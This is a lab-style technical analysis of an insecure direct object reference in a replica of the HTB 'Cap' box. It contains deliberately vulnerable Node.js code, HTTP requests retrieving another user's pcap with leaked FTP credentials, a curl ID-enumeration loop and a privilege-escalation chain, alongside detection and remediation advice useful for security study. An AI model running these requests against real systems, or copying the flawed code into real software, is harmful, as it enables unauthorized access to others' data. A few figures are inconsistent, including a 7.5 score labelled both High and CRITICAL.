# Cap IDOR Vulnerability — Deep Technical Analysis

## Vulnerability Classification

**CWE-639: Authorization Bypass Through User-Controlled Key**
**OWASP A01:2021 — Broken Access Control**
**Attack Vector:** CVSS v3.1 Network/Low/None = 7.5 High

---

## Vulnerability Mechanics

### The Flawed Design

```
┌─────────────────────────────────────────────────────────┐
│ REQUEST: GET /data/0 with Cookie: session=user123       │
├─────────────────────────────────────────────────────────┤
│                                                           │
│ 1. Extract & validate session cookie ✓                  │
│    → Session exists → User is authenticated             │
│                                                           │
│ 2. Extract capture ID from URL path ✗                   │
│    → ID=0 (user-controlled)                             │
│    → NO OWNERSHIP CHECK                                 │
│                                                           │
│ 3. Serve the pcap file for ID=0                         │
│    → Even if user doesn't own it!                       │
│                                                           │
└─────────────────────────────────────────────────────────┘
```

### Attack Surface

The `/data/<id>` endpoint is **session-scoped but not ID-scoped:**

| Endpoint | Requires Session? | Checks Ownership? | Status |
|----------|-------------------|-------------------|--------|
| `/data/3` | ✓ (200)           | ✗ (serves anyway) | ✓ 200  |
| `/data/0` | ✓ (401)           | ✗ (serves anyway) | ✓ 200  |
| `/data/0` (no session) | — | — | ✗ 401  |

**The vulnerability:** A valid session (proof of authentication) is mistaken for authorization (proof of ownership).

---

## How the Lab App Implements This

### Vulnerable Code Snippet (Node.js)

```javascript
if (url.pathname === "/capture") {
    const sid = parseCookie(req);
    const myId = sid && sessions.get(sid);
    res.writeHead(302, { location: `/data/${myId ?? 3}` });
    res.end();
    return;
}

const dataMatch = /^\/data\/(\d+)$/.exec(url.pathname);
if (dataMatch) {
    // ✗ FLAWED: Requires a session (identity-scoped)
    const sid = parseCookie(req);
    if (!sid || !sessions.has(sid)) {
        res.writeHead(401, { "content-type": "text/plain" });
        res.end("unauthorized: no session");
        return;
    }
    
    // ✗ CRITICAL: Does NOT check the id belongs to the caller
    // That missing check IS the IDOR
    const id = Number(dataMatch[1]);
    const pcap = id === 0 ? ADMIN_PCAP : EMPTY_PCAP;
    
    res.writeHead(200, {
        "content-type": "application/vnd.tcpdump.pcap",
        "content-disposition": `attachment; filename="${id}.pcap"`,
    });
    res.end(pcap);
    return;
}
```

### What's Missing

```javascript
// This check is ABSENT:
const myId = sessions.get(sid);
if (myId !== id) {
    res.writeHead(403, { "content-type": "text/plain" });
    res.end("forbidden: capture does not belong to you");
    return;
}
```

---

## Attack Execution

### Step-by-Step Request Flow

#### 1. Initial Dashboard Access

```http
GET / HTTP/1.1
Host: cap.htb
Connection: close

HTTP/1.1 200 OK
Set-Cookie: session=a1b2c3d4e5f6g7h8; Path=/; HttpOnly
Content-Type: text/html

<p>Your security snapshot id: <b>3</b></p>
<a href="/data/3">View your snapshot</a>
```

**Analysis:**
- Server assigns `session=a1b2c3d4e5f6g7h8`
- Maps session → user ID 3 (in-memory `sessions` map)
- User's own capture ID is 3

#### 2. Attacker's Own Capture (Baseline)

```http
GET /data/3 HTTP/1.1
Host: cap.htb
Cookie: session=a1b2c3d4e5f6g7h8

HTTP/1.1 200 OK
Content-Type: application/vnd.tcpdump.pcap
Content-Length: 24

<valid libpcap header, no packets>
```

**Analysis:**
- Session is valid
- User ID 3 matches requested ID 3
- Server serves the (empty) pcap

#### 3. Attack: Access Admin's Capture

```http
GET /data/0 HTTP/1.1
Host: cap.htb
Cookie: session=a1b2c3d4e5f6g7h8

HTTP/1.1 200 OK
Content-Type: application/vnd.tcpdump.pcap
Content-Length: 4767

<libpcap with FTP login: USER nathan / PASS Cap5t0ne_demo_pw!>
```

**Analysis:**
- Session is still valid (not revoked)
- User ID is 3, but requested ID is 0
- **No ownership verification → Server serves admin's pcap**
- Attacker now has plaintext credentials

---

## Why This Happens (Root Causes)

### 1. Authorization vs. Authentication Confusion

```python
# WRONG: Confusing authentication with authorization
if user_is_authenticated(session):
    serve_data(requested_id)  # ✗ Any ID

# RIGHT: Checking authorization specifically
if user_owns_resource(session, requested_id):
    serve_data(requested_id)  # ✓ Only owned ID
```

### 2. Sequential IDs Invite Enumeration

Captures are assigned sequential numeric IDs:
- ID 0 = Admin
- ID 1 = System user
- ID 2 = Root
- ID 3+ = Regular users

An attacker can trivially enumerate:
```bash
for id in {0..10}; do
    curl -s -b "session=$COOKIE" http://10.129.91.60/data/$id | file -
done
```

### 3. Lack of Rate Limiting or Auditing

The endpoint doesn't:
- Rate limit downloads
- Log who accessed which captures
- Alert on unusual access patterns

---

## Pluto's IDOR Validator

The `validate_idor` tool confirms this vulnerability through **four independent checks:**

### Check 1: Own Resource Accessible

```bash
GET /data/3 with session=<user's_session>
Expected: 200 OK + expected pcap data
Validates: The endpoint works for legitimate access
```

### Check 2: Other User's Resource Accessible

```bash
GET /data/0 with session=<user's_session>
Expected: 200 OK + DIFFERENT pcap data
Validates: No ownership check → IDOR confirmed
```

### Check 3: Substantial Data Difference

```bash
Compare /data/3 response vs /data/0 response
Expected: Different binary content
Validates: The "other" resource is real, not a decoy
```

### Check 4: Unauthenticated Requests Blocked

```bash
GET /data/0 with no session cookie
Expected: 401 Unauthorized
Validates: This is broken access control (not a public resource)
```

**All four checks must pass for validation.**

---

## Impact Analysis

### Confidentiality Breach

**What's exposed:**

1. **Network captures (pcap files)**
   - Full packet data from the admin's network session
   - Potentially years of capture history

2. **Plaintext credentials**
   - FTP login: `USER nathan` / `PASS Cap5t0ne_<pw>`
   - SSH login flows (pre-auth, post-auth)
   - Any cleartext protocol (Telnet, HTTP Basic Auth, etc.)

3. **Network topology**
   - IP addresses, MAC addresses
   - Services and versions
   - Traffic patterns

### Exploitation Chain

```
IDOR (Access Control)
    ↓
Leaked pcap file
    ↓
Plaintext FTP credentials
    ↓
SSH foothold (nathan account)
    ↓
cap_setuid escalation
    ↓
Root access + full system compromise
```

### Severity: CRITICAL

- **CVSS v3.1 Base Score: 7.5** (Network/Low/None → High)
- **Real impact:** System compromise via multi-stage exploitation
- **Data exposure:** Active network communications

---

## Detection Signatures

### Network-Level Detection

```
Signature: Rapid /data/<id> enumeration
Alert: User requests /data/0, /data/1, /data/2 in quick succession
Pattern: Sequential ID guessing
Threshold: 3+ different IDs in 1 minute from same source
```

### Application-Level Detection

```
Signature: Access mismatch detection
Alert: User requests /data/X where X != their assigned ID
Log: "User (id=3) requested unauthorized capture (id=0)"
Action: Alert security team, consider rate limiting
```

### Behavioral Detection

```
Signature: Large pcap downloads
Alert: User downloads pcap files totaling >100MB
Pattern: Could indicate credential harvesting
Action: Require re-authentication
```

---

## Real-World HTB Cap Machine Differences

The actual HTB Cap box has additional complexity:

1. **FTP service vulnerability** — vsftpd 2.3.4 may have a backdoor (CVE-2011-2523)
2. **Multiple privilege escalation vectors**
   - `cap_setuid` on Python (primary)
   - Kernel exploits (if kernel is old)
   - Sudo misconfigurations
3. **Harder to fingerprint** — May require more recon to identify the capture service
4. **Real pcap data** — Contains actual network traffic, not synthetic FTP login

---

## Remediation

### Quick Fix (Code Change)

```javascript
const dataMatch = /^\/data\/(\d+)$/.exec(url.pathname);
if (dataMatch) {
    const sid = parseCookie(req);
    if (!sid || !sessions.has(sid)) {
        res.writeHead(401, { "content-type": "text/plain" });
        res.end("unauthorized: no session");
        return;
    }
    
    const requestedId = Number(dataMatch[1]);
    const ownerId = sessions.get(sid);
    
    // ✓ ADD THIS CHECK:
    if (requestedId !== ownerId) {
        res.writeHead(403, { "content-type": "text/plain" });
        res.end("forbidden: capture does not belong to you");
        return;
    }
    
    // ... serve the pcap
}
```

### Complete Remediation Strategy

| Layer | Control |
|-------|---------|
| **Code** | Always validate ownership before serving resources |
| **Logging** | Audit all resource access with user IDs |
| **Monitoring** | Alert on access mismatches or rapid enumeration |
| **Architecture** | Use UUIDs instead of sequential IDs to prevent enumeration |
| **Testing** | Automated IDOR tests for every endpoint returning user data |

---

## Key Lessons

1. **Authentication ≠ Authorization**: Validating a session proves WHO you are, not WHAT you can access
2. **Sequential IDs are dangerous**: Encourage UUIDs or sufficiently random identifiers
3. **Defense in depth**: Combine ownership checks + rate limiting + audit logging
4. **Implicit trust is risky**: Always explicitly verify resource ownership before returning data

---

## Related Vulnerabilities in Cap Chain

### 1. Plaintext Credentials in Network Capture
- **CWE-256**: Plaintext Storage of Password
- **Impact**: Enables foothold via FTP/SSH
- **Mitigation**: Use encrypted authentication (SSH keys, TLS)

### 2. Weak Privilege Isolation
- **CWE-250**: Execution with Unnecessary Privileges
- **Issue**: Python has `cap_setuid` capability
- **Mitigation**: Principle of least privilege; remove unnecessary capabilities

### 3. Insufficient Entropy in Capability Assignment
- **CWE-330**: Use of Insufficiently Random Values
- **Issue**: Sequential user IDs are predictable
- **Mitigation**: Use cryptographically random identifiers

